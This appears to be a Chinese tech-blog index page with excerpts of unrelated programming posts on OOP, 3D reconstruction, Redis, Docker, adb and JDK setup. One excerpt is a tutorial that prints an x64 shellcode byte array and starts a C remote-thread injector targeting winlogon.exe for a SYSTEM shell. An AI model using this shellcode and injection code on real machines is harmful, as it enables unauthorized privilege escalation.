		<h2 class="list__title post__title">
			<a href="/posts/dbac83e671a8941438e9b88fb5b467a8/" rel="bookmark">
			OOP，Object Oriented Programming 面向对象的三大特性 五大基本原则
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		OOP，Object Oriented Programming
面向对象的三大特性：
1、封装
隐藏对象的属性和实现细节，仅对外提供公共访问方式，将变化隔离，便于使用，提高复用性和安全性。
2、继承
提高代码复用性；继承是多态的前提。
3、多态
父类或接口定义的引用变量可以指向子类或具体实现类的实例对象。提高了程序的拓展性。
优点：易维护、易复用、易扩展，由于面向对象有封装、继承、多态性的特性，可以设计出低耦合的系统，使系统 更加灵活、更加易于维护 .
缺点：性能比面向过程差
五大基本原则：
1、单一职责原则SRP(Single Responsibility Principle)
类的功能要单一，不能包罗万象，跟杂货铺似的。
2、开放封闭原则OCP(Open－Close Principle)
一个模块对于拓展是开放的，对于修改是封闭的，想要增加功能热烈欢迎，想要修改，哼，一万个不乐意。
3、里式替换原则LSP(the Liskov Substitution Principle LSP)
子类可以替换父类出现在父类能够出现的任何地方。比如你能代表你爸去你姥姥家干活。哈哈~~
4、依赖倒置原则DIP(the Dependency Inversion Principle DIP)
高层次的模块不应该依赖于低层次的模块，他们都应该依赖于抽象。抽象不应该依赖于具体实现，具体实现应该依赖于抽象。就是你出国要说你是中国人，而不能说你是哪个村子的。比如说中国人是抽象的，下面有具体的xx省，xx市，xx县。你要依赖的是抽象的中国人，而不是你是xx村的。
5、接口分离原则ISP(the Interface Segregation Principle ISP)
设计时采用多个与特定客户类有关的接口比采用一个通用的接口要好。就比如一个手机拥有打电话，看视频，玩游戏等功能，把这几个功能拆分成不同的接口，比在一个接口里要好的多
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf027ecfed79a8877c142712779fa7ca/" rel="bookmark">
			BundleFusion学习笔记(3)：主要算法(2)——模型重建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		求完了位姿，我们就拥有了非常完整的数据，简直可以“为所欲为”了。
BundleFusion的模型重建用的这套方案不算新了（虽然也基本是这个作者做的工作）。
0. 前言 BundleFusion的模型重建部分涉及的主要概念有：
Voxel体素TSDF数据结构VoxelHashing方法MarchingCube算法 先贴一些轮子：
基于体素的三维重建的核心思想——A Volumetric Method for Building Complex Models from Range Images 阅读笔记基于体素的三维重建的最终结果——Marching Cubes算法学习笔记 1. Voxel体素 计算机视觉的第一章中就提到：二维空间中，我们使用像素Pixel描述数据，引申到三维，自然就变成了体素（voxel可能是volumn pixel的简写）。这是连续信号离散化思想在三维空间中的使用。
在BundleFusion的方法体系中，Voxel的数据结构（引自VoxeHashing）为：
struct Voxel { float sdf; uchar colorRGB[3]; uchar weight; }; 这其中的sdf到底是什么呢？参考这篇文章中的一张图片：
不妨把一个体素看成一个点A，光心为O，射线OA与等值面的交点为B，AB的长度就是sdf，如果A在等值面外，则sdf为正，反之为负。
但是现在我们先假设，一个立方体的三维空间被等分切割成了很多个小立方体，我们使用Voxel去表示这一个一个的小立方体，就像是一个三维矩阵，只不过矩阵中的元素是一个更为复杂的数据结构。
既然我们已经有了rgbd数据，相机位姿数据和内参，就可以通过三角化以及相机-世界坐标转换，把相应的数据写入体素中。
2. TSDF（truncated signed distance） 为了节省空间，提高效率，Curless和Levoy又提出了TSDF概念，即只存储观测面区域附近的sdf。
3. Voxel Hashing方法 三维空间的膨胀是很夸张的，一个长宽高为10m的立方体，体积是长宽高为1m的立方体的1000倍。如果我们每重建一个表面，都要在内存中分配一个能包括表面的立方体那么大的空间，显然是不合理的。（这一点也从tsdf-fusion的崩溃可以看出）
而哈希技术，天然适合随机存取和小范围的更新，使用在TSDF的存储上，正合适。
具体实现略过。
4. Marching cubes重建方法 从TSDF结构到最后的mesh结果，使用的是Marching Cube算法，这个算法老但实用，相关介绍见轮子基于体素的三维重建的最终结果——Marching Cubes算法学习笔记
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca8aa76e58fa5cdf7bd0c11151b9fa42/" rel="bookmark">
			BundleFusion学习笔记(1)：概述
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1. 前言 传统SLAM的任务基本可以分为两类：定位与建图。
定位任务重在计算相机位姿，得到的是稀疏的点云结果，目前比较好的有ORBSLAM和。
建图任务重在建出完整的模型，目前比较好的就是这个2016年的BundleFusion。
2. 笔记内容 本系列文章主要记录的内容有：
概述主要算法(1)——位姿求解主要算法(2)——模型重建原作者近年其他相关工作(1)——大型室内3D数据集：MatterPort3D原作者近年其他相关工作(2)——基于深度学习的模型补全：SGNN原作者近年其他相关工作(3)——对简易的3D scan进行模型重建：tsdf-fusionBundleFusion(Win)使用&amp;踩坑记录BundleFusion(Ubuntu)使用&amp;踩坑记录 3. 简单介绍 3.1 一些性质 输入：rgbd数据（最好用连续帧）
输出：mesh模型
优点：重建模型精细度高、稳定的位姿计算、达到同步更新的计算速度、支持断点续建
缺点：因为具有断点续建的稳定性，所以很吃内存，大场景下对硬件要求较高。
适合场景：室内小场景
3.2 项目信息 BundleFusion官网中给出了一些示例数据集，质量不错（记得翻墙）
BundleFusion的官方github代码是基于Win VS的，不过也有自由开发者实现了在Linux中的版本，使用的踩坑见后续笔记。
3.3 相关内容 BundleFusion的主要作者：Matthias Niessner和Angela Dai在立体视觉领域做了很多工作，他们近十年的论文中有一条线就是围绕Volumetric Fusion进行的。这条技术线上发的论文感觉已经快把这个领域的坑都占满了。
这里再做一张技术路线的图片或者上次的那个表格。
本系列也会提到一些相关的论文或者算法，对BundleFusion领域的pipeline进行补充。
其他导引 有关重建任务，后续的简化和补全也有一些很好的算法，有兴趣请访问：
基于平面结构的模型面片简化——plane-rgbd-opt学习笔记传统方法中模型简化与补全算法之王——PoissonReconstruction泊松重建学习笔记 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/956e0774689d1dc1e6795dea19b80346/" rel="bookmark">
			基于体素的三维重建的最终结果——Marching Cubes算法学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个算法在3d重建中很常用，最早来自于1987年的论文《MARCHING CUBES: A HIGH RESOLUTION 3D SURFACE CONSTRUCTION ALGORITHM》。
不想重复造轮子，所以先贴几篇介绍这个算法的帖子：
游戏《孢子》的思考 —— Marching Cube算法
Marching Cube算法在点云重建上的简单应用
Marching Cubes初探——Marching Cubes构建体素圆
看完之后基本就对这个算法有一定的了解了。
我想补充的还有几点。
1. 论文阅读 1.1 核心思想 There are two primary steps in our approach to the surface construction problem. First, we locate the surface corresponding to a user-specified value and create triangles. Then, to ensure a quality image of the surface, we calculate the normals to the surface at each vertex of each triangle.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/956e0774689d1dc1e6795dea19b80346/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b3ab56621a6a3b81832b067ebe8f7d53/" rel="bookmark">
			在线加密视频一机一码播放器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		视频在线播放对于使用者来说很方便，不用在下载视频了，基本上有网就可以用。很多想做视频加密的版权方也希望提供这样的服务，但是H5网页视频加密对于一些机构和并不合适，则可以选择第二种方案。把加密视频放在服务器，学生只需要安装点盾云播放器即可观看，不用在下载视频看。
首先需要明确下在线点播功能是点盾云播放器的通用功能，不单独计费。如果想使用该功能，需要将加密好的视频传到服务器中，给学员的不在是加密好的视频，而是服务器地址，类似http://127.0.0.1这种格式。然后在服务器上设置一个点播页面，将需要对外的加密视频都展现出来，让学员通过播放器可以访问到服务器，看到的点播页面就是商家设置好的。学员可以直接用拿到的激活码激活视频观看自己购买的课程。也相当于是有一个自己的小网站，除了学员已经购买的 视频还可以展现其他更多的课程，起到促销的作用。当然一个激活码还是只能激活一个课程，而且只能在一个设备或允许的几个设备上看。设置到水印和到期时间这些还都是有效的，这样可解决学员下载不方便的问题，不过对于商家来说则会增加流量和服务器成本。
但是有的商家朋友可能会说，你说的点播页面和服务器我都不会自己弄，是否还可以使用点盾云的在线点播呢？当然可以的，作为一家负责人的公司就是为了让客户更方便的使用产品。我们研发了可以在服务器上直接生成点播页面的程序，他就像安装普通的软件一样，通过下一步下一步的操作即可完成，我们也会配备详细的使用说明书，也有技术同事和客服协助使用。不过该部分是单独计费的，费用是一次性的也不高。具体出来的效果如如下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d8fc68e4f50dcc1f475aa3aa87f7a90/" rel="bookmark">
			python神经网络模型_python – 神经网络的Keras模型load_weights
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		你需要先创建一个名为model的网络对象,然后在调用model.load_weights(fname)之后编译它
工作实例：
from keras.models import Sequential
from keras.layers import Dense, Activation
def build_model():
model = Sequential()
model.add(Dense(output_dim=64, input_dim=100))
model.add(Activation("relu"))
model.add(Dense(output_dim=10))
model.add(Activation("softmax"))
model.compile(loss='categorical_crossentropy', optimizer='sgd', metrics=['accuracy'])
return model
model1 = build_model()
model1.save_weights('my_weights.model')
model2 = build_model()
model2.load_weights('my_weights.model')
# do stuff with model2 (e.g. predict())
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1d2af597518def546195b185b4a3245/" rel="bookmark">
			python启动方法_Python之启动App--冷启动，热启动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言:冷启动:第一次启动App
热启动:点击返回键或者Home键之后再次启动App
冷启动步骤:1.连接模拟器:adb devices
2.得到模拟器中App的包名和Activity名称:adb logcat | findstr START,之后模拟器鼠标点击我们的应用就会显示应用信息:cmp后面的即为App的包名和Activity名称(eg：cmp=com.tencent.edu/.module.SplashActivity)复制粘贴
3.命令行启动App:adb shell am start -W -n App包名和Activity名称(cmp=com.tencent.edu/.module.SplashActivity)，之后即可启动
4.启动App整体解读:Starting: Intent { cmp=com.tencent.edu/.module.SplashActivity }
Status: ok
Activity: com.tencent.edu/.module.LoginActivity
ThisTime: 717-耗时
TotalTime: 1236-整体耗时
Complete
5.命令行停止App:adb shell am force-stop com.tencent.edu(应用包名)
冷启动相关指令:1.连接模拟器:adb devices
2.得到模拟器中App的包名和Activity名称:adb logcat | findstr START
3.命令行启动App:adb shell am start -W -n App包名和Activity名称
4.命令行停止App:adb shell am force-stop com.tencent.edu(应用包名)
清除黑窗口之前所有的指令:cls
热启动步骤:1.连接模拟器:adb devices
2.得到模拟器中App的包名和Activity名称:adb logcat | findstr START,之后模拟器鼠标点击我们的应用就会显示应用信息:cmp后面的即为App的包名和Activity名称(eg：cmp=com.tencent.edu/.module.SplashActivity)复制粘贴
3.命令行启动App:adb shell am start -W -n App包名和Activity名称(cmp=com.tencent.edu/.module.SplashActivity)，之后即可启动
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b1d2af597518def546195b185b4a3245/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e5e946552b131ae658cfe701f0431eb/" rel="bookmark">
			bat替换文件中的字符串_实例14：用Python批量替换多个Word文件中的文字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们在实例7中批量生成了采购合同。但是假设现在我方的公司名由“ABC商贸有限公司”变成了“ABC贸易有限公司”，那我们就需要去每份合同中对应位置进行替换。当然也可以修改原始模板，然后重新生成合同。此处介绍一下如何使用Python批量替换多个Word文件中的文字，即将“商贸”替换为“贸易”。
我们先去到Word文件中，查找一下“商贸”这个词出现了多少次。下图可见，运气不错，只出现了两次，一次在正文的段落中，另一次在末尾的表格中，而且都是我们要替换的。
import docx
def info_update(doc,old_info, new_info):
'''此函数用于批量替换合同中需要替换的信息
doc:文件
old_info和new_info：原文字和需要替换的新文字
'''
#读取段落中的所有run，找到需替换的信息进行替换
for para in doc.paragraphs: #
for run in para.runs:
run.text = run.text.replace(old_info, new_info) #替换信息
#读取表格中的所有单元格，找到需替换的信息进行替换
for table in doc.tables:
for row in table.rows:
for cell in row.cells:
cell.text = cell.text.replace(old_info, new_info) #替换信息 我们上面直接借用实例7中定义好的用于替换文字的函数info_update。只需要向其中传入目标文件路径，待替换的词和新词即可。然后导入os库，获取目标文件及其路径，如下。
import os #用于获取目标文件所在路径
path="data/" # 文件夹路径
files=[]
for file in os.listdir(path):
if file.endswith(".docx"): #排除文件夹内的其它干扰文件，只获取word文件
files.append(path+file) files
&gt;&gt;
['data/公司001合同.docx',
'data/公司002合同.docx',
'data/公司003合同.docx',
'data/公司004合同.docx',
'data/公司005合同.docx',
'data/公司006合同.docx',
'data/公司007合同.docx',
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2e5e946552b131ae658cfe701f0431eb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/be60860e6640304fa679427fb9abc8c6/" rel="bookmark">
			python使用redis_Python操作Redis，你要的都在这了！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Redis是一个基于内存的高效的键值型非关系型数据库，存取效率极高，而且支持多种存储数据结构，使用也非常简单。本节中，我们就来介绍一下Python的Redis操作，主要介绍RedisPy这个库的用法。
1. 准备工作
在开始之前，请确保已经安装好了Redis及RedisPy库。如果要做数据导入/导出操作的话，还需要安装RedisDump。
2. Redis 和 StrictRedis
RedisPy库提供两个类Redis和StrictRedis来实现Redis的命令操作。
StrictRedis实现了绝大部分官方的命令，参数也一一对应，比如set()方法就对应Redis命令的set方法。而Redis是StrictRedis的子类，它的主要功能是用于向后兼容旧版本库里的几个方法。为了做兼容，它将方法做了改写，比如lrem()方法就将value和num参数的位置互换，这和Redis命令行的命令参数不一致。
官方推荐使用StrictRedis，所以本节中我们也用StrictRedis类的相关方法作演示。
3. 连接Redis
现在我们已经在本地安装了Redis并运行在6379端口，密码设置为foobared。那么，可以用如下示例连接Redis并测试：
from redis importStrictRedis
redis= StrictRedis(host='localhost', port=6379, db=0, password='foobared')
redis.set('name', 'Bob')print(redis.get('name'))
这里我们传入了Redis的地址、运行端口、使用的数据库和密码信息。在默认不传的情况下，这4个参数分别为localhost、6379、0和None。首先声明了一个StrictRedis对象，接下来调用set()方法，设置一个键值对，然后将其获取并打印。
运行结果如下：
b'Bob'
这说明我们连接成功，并可以执行set()和get()操作了。
当然，我们还可以使用ConnectionPool来连接，示例如下：
from redis importStrictRedis, ConnectionPool
pool= ConnectionPool(host='localhost', port=6379, db=0, password='foobared')
redis= StrictRedis(connection_pool=pool)
这样的连接效果是一样的。观察源码可以发现，StrictRedis内其实就是用host和port等参数又构造了一个ConnectionPool，所以直接将ConnectionPool当作参数传给StrictRedis也一样。
另外，ConnectionPool还支持通过URL来构建。URL的格式支持有如下3种：
redis://[:password]@host:port/db
rediss://[:password]@host:port/db
unix://[:password]@/path/to/socket.sock?db=db
这3种URL分别表示创建Redis TCP连接、Redis TCP+SSL连接、Redis UNIX socket连接。我们只需要构造上面任意一种URL即可，其中password部分如果有则可以写，没有则可以省略。下面再用URL连接演示一下：
url = 'redis://:foobared@localhost:6379/0'pool=ConnectionPool.from_url(url)
redis= StrictRedis(connection_pool=pool)
这里我们使用第一种连接字符串进行连接。首先，声明一个Redis连接字符串，然后调用from_url()方法创建ConnectionPool，接着将其传给StrictRedis即可完成连接，所以使用URL的连接方式还是比较方便的。
4. 键操作
下表总结了键的一些判断和操作方法。
方法作用参数说明示例示例说明示例结果
exists(name)
判断一个键是否存在
name：键名
redis.exists('name')
是否存在name这个键
True
delete(name)
删除一个键
name：键名
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/be60860e6640304fa679427fb9abc8c6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43efffa6e2ae1e2033013304d4d7c797/" rel="bookmark">
			if-else语句
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		分支结构之简单if-else语句
简单的if-else语句的基本结构:
语义是: 如果表达式的值为真，则执行代码块1，否则执行代码块2。
注意：
if()后面没有分号，直接写{},else后面也没有分号，直接写{}
分支结构之多重if-else语句
C语言中多重if-else语句，其结构如下：
语义是：依次判断表达式的值，当出现某个值为真时，则执行对应代码块，否则执行代码块n。
注意：当某一条件为真的时候，则不会向下执行该分支结构的其他语句。
分支结构之嵌套if-else语句
C语言中嵌套if-else语句。嵌套if-else语句的意思，就是在if-else语句中，再写if-else语句。其一般形式为：
循环结构之while循环
反复不停的执行某个动作就是江湖人称的循环 。
C语言中有三种循环结构,先看一下C语言while循环的结构
其中表达式表示循环条件，执行代码块为循环体。
while语句的语义是：计算表达式的值，当值为真(非0)时， 执行循环体代码块。
while语句中的表达式一般是关系表达或逻辑表达式，当表达式的值为假时不执行循环体，反之则循环体一直执行。
一定要记着在循环体中改变循环变量的值，否则会出现死循环（无休止的执行）。
循环体如果包括有一个以上的语句，则必须用{}括起来，组成复合语句。
循环结构之do-while循环
C语言中的do-while循环，一般形式如下：
do-while循环语句的语义是:
它先执行循环中的执行代码块，然后再判断while中表达式是否为真，如果为真则继续循环；如果为假，则终止循环。因此，do-while循环至少要执行一次循环语句。
注意：mtianyan: 使用do-while结构语句时，while括号后必须有分号。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bab81d9dd17fee01e65debea24212406/" rel="bookmark">
			org.apache.hadoop.ipc.RemoteException(org.apache.hadoop.hdfs.protocol.AlreadyBeingCreatedException):
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		错误：org.apache.hadoop.ipc.RemoteException(org.apache.hadoop.hdfs.protocol.AlreadyBeingCreatedException): Failed to APPEND_FILE /user/root/aaaa.txt for DFSClient_NONMAPREDUCE_-832332576_1 on 172.17.0.1 because DFSClient_NONMAPREDUCE_-832332576_1 is already the current lease holder.
出现这个问题的原因是，你开启了一个流，像FileSystem等，但是没有关闭，就又在别处使用了一个相同的流，只要将之前的关闭就可以了
我在上面用一个fs，但是我没有关闭，而我在appendToFile函数里又用到了fs，所以出现了错误
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/054bd01b67a5d7c847a633a5cc0fb845/" rel="bookmark">
			小苹果源地址_越狱常用源地址推荐
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 常用源地址推荐：
http://repo.cydiabc.t 小苹果源
http://apt.cydiaba.cn 贴吧源 http://apt.htv123.com 电话助手作者源 https://soda-ldz.yourepo.com 苏达微信美化源 http://ib-soft.net/cydia (iCleaner pro作者源) http://sutuplus.github.io/repo 苏兔美化源
http://apt.dddjb.cn 知网少年源 http://apt.cydia.bi/ Bi源(搞机源) http://apt.ss03.cn 艾锋源
http://apt.cydiaba.cn 贴吧源
http://apt.xbsite.cn 知网小白源 http://rpetri.ch/repo 依赖更新最快 国外源需挂v
http://apt.thebigboss.org/repofiles/cydia 大老板源
欢迎留言，分享你常用的源，或者说出你想要的源，大白手里还收藏了很多很多源下次推荐哦～ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d4fee86566f35776970c9718a5ed2fc/" rel="bookmark">
			win10_x64下shellcode提权工具(SYSTEM权限)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前写过一篇远线程注入与一篇shellcode编写的文章：
Win10_X64远线程注入dll(非CreateRemoteThread)
Windows 10_X64环境shellcode编写
上一次是通过远线程注入，将指定的dll模块加载进我们指定的进程，这一次将我们写好的shellcode注入进指定的进程，从而执行任意代码。
首先我们要清楚如何获取一个具有system权限的cmd，想要获取一个具有system权限的cmd，首先这个cmd得是一个具有system权限进程的子进程，windows下具有system权限的进程有：winlogon.exe、wininit.exe等，这次我们就通过对winlogon.exe进行远线程注入shellcode拿到一个system权限的cmd。
shellcode 首先明确shellcode是有一段汇编代码编写而成，然后转为机器码存在内存中然后直接从内存中去执行的数据，关于shellcode的代码编写此处不做详细介绍可以去看之前的那一篇，我们直接从用编译好的exe提取机器码的部分开始。
很多人对提取机器码都感到头疼，都觉得那是一项体力活，其实只要掌握善用动态调试工具就可以轻松的搞到机器码。
首先打开x64dbg，将我们刚刚用nasm编译好的程序拖入x64dbg
可以看到这并不是我们要的汇编代码，这些代码是由编译器生成用于将我们的程序正确被进程加载器加载的一段代码，想要找到我们的汇编代码，可以直接选中符号，然后选中我们编译好的进程，就能看到我们要找的代码了
这就是我们想要的代码也就是在上一篇文章中写好的汇编程序，现在我们来提取机器码，首先将我们写好要注入的代码全部选中，然后右击选“二进制-&gt;复制”，就可以得到我们需要的机器码
注入程序 然后来写C语言部分，这部分其实就是一个远线程注入程序。
首先将刚刚拿到的机器码拷入我们的程序源代码，因为我们需要的是十六进制数组的形式，可以利用记事本自带的替换功能，吧所有的空格替换为“,0x”即可，然后直接粘贴进程序
//shellcode机器码 unsigned char shellcode[] = { 0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x48,0x83,0xEC,0x28,0x4D,0x31,0xC0,0x48,0x31,0xC9,0x4D,0x31,0xD2,0x49,0x83, 0xC2,0x60,0x65,0x49,0x8B,0x02,0x48,0x8B,0x40,0x18,0x48,0x8B,0x70,0x20,0x48,0xAD,0x48,0x96,0x48,0xAD,0x48,0x8B, 0x58,0x20,0x4D,0x31,0xC0,0x44,0x8B,0x43,0x3C,0x48,0x31,0xD2,0x4C,0x89,0xC2,0x48,0x01,0xDA,0x48,0xC7,0xC0,0xFF, 0xFF,0xFF,0xFF,0x48,0x2D,0x77,0xFF,0xFF,0xFF,0x44,0x8B,0x04,0x02,0x49,0x01,0xD8,0x48,0x31,0xF6,0x41,0x8B,0x70, 0x20,0x48,0x01,0xDE,0x48,0x31,0xC9,0x41,0xB9,0x57,0x69,0x6E,0x45,0x48,0xFF,0xC1,0x48,0x31,0xC0,0x8B,0x04,0x8E, 0x48,0x01,0xD8,0x44,0x39,0x08,0x75,0xEF,0x48,0x31,0xF6,0x41,0x8B,0x70,0x24,0x48,0x01,0xDE,0x66,0x8B,0x0C,0x4E, 0x48,0x31,0xF6,0x41,0x8B,0x70,0x1C,0x48,0x01,0xDE,0x48,0x31,0xD2,0x8B,0x14,0x8E,0x48,0x01,0xDA,0x48,0x89,0xD7, 0x48,0xC7,0xC0,0xFF,0xFF,0xFF,0xFF,0x48,0x2D,0x9C,0x92,0x9B,0xFF,0x50,0x48,0x89,0xE1,0x48,0x31,0xD2,0x48,0x83, 0xC2,0x05,0xFF,0xD7,0x48,0x83,0xC4,0x30,0x5D,0x5F,0x5E,0x5B,0x5A,0x59,0x58,0xC3 }; 然后开始编写注入程序，首先要对我们的进程本身获得调试权限
/* 设定本进程的程序调试权限 lPcstr:权限字符串 backCode:错误返回码 */ BOOL GetDebugPrivilege( _In_ LPCSTR lPcstr, _Inout_ DWORD* backCode ) { HANDLE Token = NULL; LUID luid = { 0 }; TOKEN_PRIVILEGES Token_privileges = { 0 }; //内存初始化为zero memset(&amp;luid, 0x00, sizeof(luid)); memset(&amp;Token_privileges, 0x00, sizeof(Token_privileges)); //打开进程令牌 if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0d4fee86566f35776970c9718a5ed2fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb5d9b1fbda0e93172b129b72c61dfab/" rel="bookmark">
			docker镜像启动后端口号是多少_Docker 安装部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		# Docker 使用说明
#### Docker 下载地址
```
阿里云 https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors
```
#### 国内镜像
```
网易蜂巢 https://c.163yun.com/hub#/home
```
#### Docker指令
```
查看镜像列表：docker http://hub.c.163.com/library/nginx
获取镜像：docker pull http://hub.c.163.com/library/nginx
查看本地镜像：docker images
查看运行镜像：docker ps
```
#### Docker 客户端 - 镜像地址配置
```
"registry-mirrors": [
"https://***.com"
]
```
#### 启动 &amp;&amp; 进入 &amp;&amp; 停止
```
前台运行：docker run http://hub.c.163.com/library/nginx
后台运行：docker run -d http://hub.c.163.com/library/nginx
进入：docker exec -it cc bash
-it 是运行参数
cc 是后台运行的容器ID
bash 是运行指令
停止：docker stop cc
```
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb5d9b1fbda0e93172b129b72c61dfab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7ffab77ad9003ddd3b8d3d4ff0f8fc8/" rel="bookmark">
			shell中md5sum计算结果同编成生成MD5不同原因分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		md5sum文件会在文件的最后增加一个’\n’，再进行md5运算。
用echo “password” |md5sum生成的结果也是一样，因为echo也是在最后增加了一个”\n”。
所以使用md5sum加密字符串的时候应该避免这个问题，要echo -n “passwd”|md5sum, -n代表不输出’\n’符。
文件也是如此：
echo -n xxx.txt | md5sum 就可以了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/247c9312a33ab8639ed917036a281abf/" rel="bookmark">
			Firefox for Android 代理设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目前发现 Android 平台的浏览器原生支持代理配置的仅 Firefox for Android（官方下载），不仅支持 HTTP、HTTPS 和 Socks4、5，还支持 PAC 脚本。在 Firefox 中访问 about:config，使用 proxy 过滤器并的找到 network.proxy.socks, network.proxy.socks_port, network.proxy.socks_remote_dns, network.proxy.type 并更改成图中配置。
HTTP代理配置：
修改以下设置：
network.proxy.http修改为127.0.0.1（默认值为空）
network.proxy.http_port修改为8087（默认值为0）
network.proxy.socks_remote_dns修改为true（默认值为false，须改为true）
network.proxy.ssl修改为127.0.0.1
network.proxy.ssl_port修改为8087
network.proxy.type修改为1（默认值为5，必须改为1才能使用代理）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5cba6ef5907e0475ce4e36bc5c8e0c9f/" rel="bookmark">
			禁用android的IPV6
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		echo 1 &gt; /proc/sys/net/ipv6/conf/wlan0/disable_ipv6
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0308fa6ef77814d6d0e978de50eb2513/" rel="bookmark">
			Windows10安装JDK和配置环境变量详细教程(亲测有效)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一. 软件下载 官网下载地址 https://www.oracle.com/java/technologies/javase-downloads.html
（1）点击下载
点击Download下载
（2）选择Accept License Agreement
选择Accept License Agreement
（3）选择版本
这里我们选择windows64位.exe可执行文件版本即可
二. 软件安装 下载完成后，双击安装包即可安装。
（1）单击下一步
单击下一步
（2）选择安装路径
选择安装路径
更改路径
如果不需要修改则直接下一步，需要更改路径则点击更改，选择你要安装的路径即可。
（3）安装完成
安装完成
等待片刻后安装完成，点击关闭即可。 三. 环境变量配置 进入 控制面板 -&gt; 系统和安全 -&gt; 系统 -&gt; 高级系统设置 -&gt; 环境变量
（1）打开控制面板 选择 系统和安全
系统和安全
（2）选择系统
（3）选择左侧 高级系统设置
（4）点击 环境变量
（5）新建系统环境变量 JAVA_HOME 在下方的系统环境变量(S)区域，点击新建，变量名为 JAVA_HOME ，变量值是你自己的JDK安装路径
（6）在Path中增加 %JAVA_HOME%\bin 双击Path,点击新建，输入 %JAVA_HOME%\bin
编辑Path
点击新建
最后点击确定，环境就全配置好了。
四. 验证环境是否配置成功 （1）win+R 键运行，输入cmd，回车。或者点击搜索，输入cmd，点击运行。输入 java -version，注意中间有空格
运行cmd，输入 java -version
这是运行 java -version 的效果
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0308fa6ef77814d6d0e978de50eb2513/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/954af195f518a32d6518950de221b487/" rel="bookmark">
			cass怎么添加指北针图例_答疑|CASS怎么添加图例？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有用户拿着2017版的图式过来找我，图式的附图中，图框的右侧都有一个“图例”。CASS咋没有呢？怎么解决？
图式的图例截图 答疑 CASS暂时只有5000-100000比例尺的图框可以输出“图例”，500-2000比例尺的图框，暂时没有图例。
怎么添加 (1)打开图框的块文件 启动CASS，命令行输入open，打开下图所示的两个块文件。
(2)添加图例 在图框右侧添加下图所示的图例。保存文件。
(3)检查图例效果 启动CASS，点击菜单“绘图处理-标准图幅”，如果图框外侧有图例，说明添加成功。
复盘总结 其实CASS的标准图框，是调用图框的图块文件（ac50tk和ac45tk）生成的。只要在这个图框的图块上面，加上想要的图例图块，加图例的效果就可以实现了。但是还有一个bug。如果生成任意图框、倾斜图框，想加上图例怎么解决？呃，目前还没办法解决。如果小伙伴们，有更好的方法解决这个问题，可以来生态圈（http://o.southgis.com）和我交流。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
